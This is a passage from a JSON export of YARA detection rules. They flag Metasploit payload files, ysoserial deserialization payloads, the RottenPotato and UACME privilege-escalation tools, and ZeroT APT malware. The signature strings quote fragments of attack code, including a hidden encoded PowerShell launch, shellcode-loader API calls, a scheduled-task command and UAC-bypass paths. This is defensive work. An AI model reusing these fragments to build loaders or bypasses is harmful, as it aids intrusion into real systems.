UBound(Tsw), &H1000, &H40)\" fullword ascii\n      $s3 = \"= RtlMoveMemory(\" ascii\n   condition: \n      all of them\n}","date":"2017-02-09 10:47:41","description":"Metasploit Payloads - file msf.vba","minimum_yara":"1.7","name":"Msfpayloads_msf_7_RID2DCF","reference":"Internal Research","required_modules":[],"rule_hash":"7c79766669369184f5c83d2cc661fd07","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_cmd_RID2ECC : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-cmd.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e\" ascii\n   condition: \n      all of them\n}","date":"2017-02-09 11:29:51","description":"Metasploit Payloads - file msf-cmd.ps1","minimum_yara":"1.7","name":"Msfpayloads_msf_cmd_RID2ECC","reference":"Internal Research","required_modules":[],"rule_hash":"b691fa04a573b4b59d1f92827649e6a5","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_svc_RID2EE4 : APT DEMO EXE FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-svc.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:33:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PAYLOAD:\" fullword ascii\n      $s2 = \".exehll\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}","date":"2017-02-09 11:33:51","description":"Metasploit Payloads - file msf-svc.exe","minimum_yara":"1.7","name":"Msfpayloads_msf_svc_RID2EE4","reference":"Internal Research","required_modules":[],"rule_hash":"2f22d6c0722499ad261e9a77b4b3a1a5","score":75,"tags":["APT","DEMO","EXE","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_exe_RID2EDA : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-exe.vba\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"'* PAYLOAD DATA\" fullword ascii\n      $s2 = \" = Shell(\" ascii\n      $s3 = \"= Environ(\\\"USERPROFILE\\\")\" fullword ascii\n      $s4 = \"'**************************************************************\" fullword ascii\n      $s5 = \"ChDir (\" fullword ascii\n      $s6 = \"'* MACRO CODE\" fullword ascii\n   condition: \n      4 of them\n}","date":"2017-02-09 11:32:11","description":"Metasploit Payloads - file msf-exe.vba","minimum_yara":"1.7","name":"Msfpayloads_msf_exe_RID2EDA","reference":"Internal Research","required_modules":[],"rule_hash":"66c4082681535a7bfc5d528eedc737fa","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_3_RID2DCB : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.psh\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[DllImport(\\\"kernel32.dll\\\")] public static extern int WaitForSingleObject(\" ascii\n      $s2 = \"public enum MemoryProtection { ExecuteReadWrite = 0x40 }\" fullword ascii\n      $s3 = \".func]::VirtualAlloc(0,\" \n      $s4 = \".func+AllocationType]::Reserve -bOr [\" ascii\n      $s5 = \"New-Object System.CodeDom.Compiler.CompilerParameters\" fullword ascii\n      $s6 = \"ReferencedAssemblies.AddRange(@(\\\"System.dll\\\", [PsObject].Assembly.Location))\" fullword ascii\n      $s7 = \"public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\" fullword ascii\n      $s8 = \".func]::CreateThread(0,0,$\" fullword ascii\n      $s9 = \"public enum Time : uint { Infinite = 0xFFFFFFFF }\" fullword ascii\n      $s10 = \"= [System.Convert]::FromBase64String(\\\"/\" ascii\n      $s11 = \"{ $global:result = 3; return }\" fullword ascii\n   condition: \n      4 of them\n}","date":"2017-02-09 10:47:01","description":"Metasploit Payloads - file msf.psh","minimum_yara":"1.7","name":"Msfpayloads_msf_3_RID2DCB","reference":"Internal Research","required_modules":[],"rule_hash":"3a43f75fbb94c831f1c54baa3466648c","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_4_RID2DCC : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= VirtualAlloc(IntPtr.Zero,(UIntPtr)\" ascii\n      $s2 = \".Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);\" ascii\n      $s3 = \"[System.Runtime.InteropServices.DllImport(\\\"kernel32\\\")]\" fullword ascii\n      $s4 = \"private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;\" fullword ascii\n      $s5 = \"private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);\" fullword ascii\n   condition: \n      4 of them\n}","date":"2017-02-09 10:47:11","description":"Metasploit Payloads - file msf.aspx","minimum_yara":"1.7","name":"Msfpayloads_msf_4_RID2DCC","reference":"Internal Research","required_modules":[],"rule_hash":"9bc51f4c650cc6c870049ee0cfd32b39","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_exe_2_RID2F6B : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-exe.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"= new System.Diagnostics.Process();\" fullword ascii\n      $x2 = \".StartInfo.UseShellExecute = true;\" fullword ascii\n      $x3 = \", \\\"svchost.exe\\\");\" ascii\n      $s4 = \" = Path.GetTempPath();\" ascii\n   condition: \n      all of them\n}","date":"2017-02-09 11:56:21","description":"Metasploit Payloads - file msf-exe.aspx","minimum_yara":"1.7","name":"Msfpayloads_msf_exe_2_RID2F6B","reference":"Internal Research","required_modules":[],"rule_hash":"cbddf03027b5588e6652a30585761c8d","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_6_RID2DCE : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n      $s2 = \"= CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n      $s3 = \".GetSpecialFolder(2)\" ascii\n      $s4 = \".Write Chr(CLng(\\\"\" ascii\n      $s5 = \"= \\\"4d5a90000300000004000000ffff00\" ascii\n      $s6 = \"For i = 1 to Len(\" ascii\n      $s7 = \") Step 2\" ascii\n   condition: \n      5 of them\n}","date":"2017-02-09 10:47:31","description":"Metasploit Payloads - file msf.vbs","minimum_yara":"1.7","name":"Msfpayloads_msf_6_RID2DCE","reference":"Internal Research","required_modules":[],"rule_hash":"175e63063471242fa838634ceed72911","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_8_RID2DD0 : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[DllImport(\\\"kernel32.dll\\\")]\" fullword ascii\n      $s2 = \"[DllImport(\\\"msvcrt.dll\\\")]\" fullword ascii\n      $s3 = \"-Name \\\"Win32\\\" -namespace Win32Functions -passthru\" fullword ascii\n      $s4 = \"::VirtualAlloc(0,[Math]::Max($\" ascii\n      $s5 = \".Length,0x1000),0x3000,0x40)\" ascii\n      $s6 = \"public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\" fullword ascii\n      $s7 = \"::memset([IntPtr]($\" ascii\n   condition: \n      6 of them\n}","date":"2017-02-09 10:47:51","description":"Metasploit Payloads - file msf.ps1","minimum_yara":"1.7","name":"Msfpayloads_msf_8_RID2DD0","reference":"Internal Research","required_modules":[],"rule_hash":"2e765466ba0bb3c1c4199f02ad6d2a11","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_9_RID2DD1 : APT DEMO FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.war - contents\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:48:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (System.getProperty(\\\"os.name\\\").toLowerCase().indexOf(\\\"windows\\\") != -1)\" fullword ascii\n      $s2 = \".concat(\\\".exe\\\");\" fullword ascii\n      $s3 = \"[0] = \\\"chmod\\\";\" ascii\n      $s4 = \"= Runtime.getRuntime().exec(\" ascii\n      $s5 = \", 16) & 0xff;\" ascii\n      $x1 = \"4d5a9000030000000\" ascii\n   condition: \n      4 of ( $s* ) or ( uint32 ( 0 ) == 0x61356434 and $x1 at 0 )\n}","date":"2017-02-09 10:48:01","description":"Metasploit Payloads - file msf.war - contents","minimum_yara":"1.7","name":"Msfpayloads_msf_9_RID2DD1","reference":"Internal Research","required_modules":[],"rule_hash":"00a136ef60d7bf67940d0546a6f3102d","score":75,"tags":["APT","DEMO","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_10_RID2DF9 : APT DEMO EXE FILE METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 } \n      $s2 = { 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b } \n      $s3 = { 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-02-09 10:54:41","description":"Metasploit Payloads - file msf.exe","minimum_yara":"1.7","name":"Msfpayloads_msf_10_RID2DF9","reference":"Internal Research","required_modules":[],"rule_hash":"a78d9893c06526720770fbd1beebd552","score":75,"tags":["APT","DEMO","EXE","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_11_RID2DFA : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf.hta\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 10:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".ExpandEnvironmentStrings(\\\"%PSModulePath%\\\") + \\\"..\\\\powershell.exe\\\") Then\" fullword ascii\n      $s2 = \"= CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n      $s3 = \"= CreateObject(\\\"Wscript.Shell\\\") \" fullword ascii\n   condition: \n      all of them\n}","date":"2017-02-09 10:54:51","description":"Metasploit Payloads - file msf.hta","minimum_yara":"1.7","name":"Msfpayloads_msf_11_RID2DFA","reference":"Internal Research","required_modules":[],"rule_hash":"18131350f6e32055b0a01b7c58bfb8ee","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule Msfpayloads_msf_ref_RID2ED5 : APT DEMO METASPLOIT {\n   meta:\n      description = \"Metasploit Payloads - file msf-ref.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-02-09 11:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, METASPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"kernel32.dll WaitForSingleObject),\" ascii\n      $s2 = \"= ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')\" ascii\n      $s3 = \"GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object\" ascii\n      $s4 = \".DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',\" ascii\n      $s5 = \"= [System.Convert]::FromBase64String(\" ascii\n      $s6 = \"[Parameter(Position = 0, Mandatory = $True)] [Type[]]\" fullword ascii\n      $s7 = \"DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,\" ascii\n   condition: \n      5 of them\n}","date":"2017-02-09 11:31:21","description":"Metasploit Payloads - file msf-ref.ps1","minimum_yara":"1.7","name":"Msfpayloads_msf_ref_RID2ED5","reference":"Internal Research","required_modules":[],"rule_hash":"8226d4e88ddffb51f8fd9722dfdf1bef","score":75,"tags":["APT","DEMO","METASPLOIT"]},{"author":"Florian Roth","content":"rule RottenPotato_Potato_RID2EDA : DEMO EXE FILE HKTL T1053 T1068 {\n   meta:\n      description = \"Detects a component of privilege escalation tool Rotten Potato - file Potato.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/foxglovesec/RottenPotato\"\n      date = \"2017-02-07 11:32:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1053, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Potato.exe -ip <ip>\" fullword wide\n      $x2 = \"-enable_httpserver true -enable_spoof true\" fullword wide\n      $x3 = \"/C schtasks.exe /Create /TN omg /TR\" fullword wide\n      $x4 = \"-enable_token true -enable_dce true\" fullword wide\n      $x5 = \"DNS lookup succeeds - UDP Exhaustion failed!\" fullword wide\n      $x6 = \"DNS lookup fails - UDP Exhaustion worked!\" fullword wide\n      $x7 = \"\\\\obj\\\\Release\\\\Potato.pdb\" fullword ascii\n      $x8 = \"function FindProxyForURL(url,host){if (dnsDomainIs(host, \\\"localhost\\\")) return \\\"DIRECT\\\";\" fullword wide\n      $s1 = \"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /K start\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2017-02-07 11:32:11","description":"Detects a component of privilege escalation tool Rotten Potato - file Potato.exe","minimum_yara":"1.7","name":"RottenPotato_Potato_RID2EDA","reference":"https://github.com/foxglovesec/RottenPotato","required_modules":[],"rule_hash":"be54bbe28b6c8d7fbda4dd525f684be9","score":90,"tags":["T1068","DEMO","T1053","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Ysoserial_Payload_MozillaRhino1_RID335D : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Ysoserial Payloads - file MozillaRhino1.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 14:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"ysoserial.payloads\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and all of them )\n}","date":"2017-02-04 14:44:41","description":"Ysoserial Payloads - file MozillaRhino1.bin","minimum_yara":"1.7","name":"Ysoserial_Payload_MozillaRhino1_RID335D","reference":"https://github.com/frohoff/ysoserial","required_modules":[],"rule_hash":"8934c8ff15926773a414f894c703daa9","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule Ysoserial_Payload_C3P0_RID2F4A : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Ysoserial Payloads - file C3P0.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 11:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"exploitppppw\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 3KB and all of them )\n}","date":"2017-02-04 11:50:51","description":"Ysoserial Payloads - file C3P0.bin","minimum_yara":"1.7","name":"Ysoserial_Payload_C3P0_RID2F4A","reference":"https://github.com/frohoff/ysoserial","required_modules":[],"rule_hash":"91f08fe0780be9cd747e0f093afa444b","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule Ysoserial_Payload_Spring1_RID30F8 : DEMO EXPLOIT T1193 T1203 {\n   meta:\n      description = \"Ysoserial Payloads - file Spring1.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 13:02:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\u001fysoserial/Pwner\" ascii\n   condition: \n      1 of them\n}","date":"2017-02-04 13:02:31","description":"Ysoserial Payloads - file Spring1.bin","minimum_yara":"1.7","name":"Ysoserial_Payload_Spring1_RID30F8","reference":"https://github.com/frohoff/ysoserial","required_modules":[],"rule_hash":"3fe632c1a293ef89c1bef75d4e0348bd","score":75,"tags":["EXPLOIT","DEMO","T1203","T1193"]},{"author":"Florian Roth","content":"rule Ysoserial_Payload_RID2DF5 : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Ysoserial Payloads\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 10:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ysoserial/payloads/\" ascii\n      $s1 = \"StubTransletPayload\" fullword ascii\n      $s2 = \"Pwnrpw\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and $x1 ) or ( all of them )\n}","date":"2017-02-04 10:54:01","description":"Ysoserial Payloads","minimum_yara":"1.7","name":"Ysoserial_Payload_RID2DF5","reference":"https://github.com/frohoff/ysoserial","required_modules":[],"rule_hash":"c09b748a4000de9c47f75f4b2ea7fde3","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule Ysoserial_Payload_3_RID2E87 : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Ysoserial Payloads - from files JavassistWeld1.bin, JBossInterceptors.bin\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/frohoff/ysoserial\"\n      date = \"2017-02-04 11:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ysoserialq\" fullword ascii\n      $s1 = \"targetClassInterceptorMetadatat\" fullword ascii\n      $s2 = \"targetInstancet\" fullword ascii\n      $s3 = \"targetClassL\" fullword ascii\n      $s4 = \"POST_ACTIVATEsr\" fullword ascii\n      $s5 = \"PRE_DESTROYsq\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xedac and filesize < 10KB and $x1 ) or ( all of them )\n}","date":"2017-02-04 11:18:21","description":"Ysoserial Payloads - from files JavassistWeld1.bin, JBossInterceptors.bin","minimum_yara":"1.7","name":"Ysoserial_Payload_3_RID2E87","reference":"https://github.com/frohoff/ysoserial","required_modules":[],"rule_hash":"5b94086ac1d2f8b5e59a31ea5abbf526","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule CN_APT_ZeroT_nflogger_RID2EEC : APT CHINA DEMO EXE FILE HKTL MAL {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file nflogger.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 11:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, HKTL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\LoaderDll.VS2010\\\\Release\\\\\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-02-04 11:35:11","description":"Chinese APT by Proofpoint ZeroT RAT  - file nflogger.dll","minimum_yara":"1.7","name":"CN_APT_ZeroT_nflogger_RID2EEC","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"c6da9a3b5b6b098b5264b526aa963a83","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_APT_ZeroT_extracted_Go_RID3071 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file Go.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 12:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\cmd.exe /c %s\\\\Zlh.exe\" fullword ascii\n      $x2 = \"\\\\BypassUAC.VS2010\\\\Release\\\\\" fullword ascii\n      $s1 = \"Zjdsf.exe\" fullword ascii\n      $s2 = \"SS32prep.exe\" fullword ascii\n      $s3 = \"windowsgrep.exe\" fullword ascii\n      $s4 = \"Sysdug.exe\" fullword ascii\n      $s5 = \"Proessz.exe\" fullword ascii\n      $s6 = \"%s\\\\Zlh.exe\" fullword ascii\n      $s7 = \"/C %s\\\\%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 7 of them )\n}","date":"2017-02-04 12:40:01","description":"Chinese APT by Proofpoint ZeroT RAT  - file Go.exe","minimum_yara":"1.7","name":"CN_APT_ZeroT_extracted_Go_RID3071","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"43282f950d27bb23f7dbe98fb1dd98a4","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule CN_APT_ZeroT_extracted_Mcutil_RID3229 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Chinese APT by Proofpoint ZeroT RAT  - file Mcutil.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-04 13:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LoaderDll.dll\" fullword ascii\n      $s2 = \"QageBox1USER\" fullword ascii\n      $s3 = \"xhmowl\" fullword ascii\n      $s4 = \"?KEYKY\" fullword ascii\n      $s5 = \"HH:mm:_s\" fullword ascii\n      $s6 = \"=licni] has maX0t\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 3 of them ) or ( all of them )\n}","date":"2017-02-04 13:53:21","description":"Chinese APT by Proofpoint ZeroT RAT  - file Mcutil.dll","minimum_yara":"1.7","name":"CN_APT_ZeroT_extracted_Mcutil_RID3229","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"4367593873fb45197e435f13afc80b26","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule UACME_Akagi_2_RID2B49 : DEMO EXE FILE HKTL T1088 T1183 {\n   meta:\n      description = \"Detects Windows User Account Control Bypass - from files Akagi32.exe, Akagi64.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/hfiref0x/UACME\"\n      date = \"2017-02-03 09:00:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1088, T1183\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: Akagi.exe [Method] [OptionalParamToExecute]\" fullword wide\n      $x2 = \"[UCM] Target file already exists, abort\" fullword wide\n      $s1 = \"MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\" fullword wide\n      $s2 = \"Akagi.exe\" fullword wide\n      $s3 = \"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}\" fullword wide\n      $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\sysprep\" fullword wide\n      $s5 = \"/c wusa %ws /extract:%%windir%%\\\\system32\\\\migwiz\" fullword wide\n      $s6 = \"loadFrom=\\\"%systemroot%\\\\system32\\\\sysprep\\\\cryptbase.DLL\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )\n}","date":"2017-02-03 09:00:01","description":"Detects Windows User Account Control Bypass - from files Akagi32.exe, Akagi64.exe","minimum_yara":"1.7","name":"UACME_Akagi_2_RID2B49","reference":"https://github.com/hfiref0x/UACME","required_modules":[],"rule_hash":"26b20569c1f315363b7c07b3664ff069","score":80,"tags":["T1088","DEMO","T1183","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_1_RID2CC8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"suprise.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 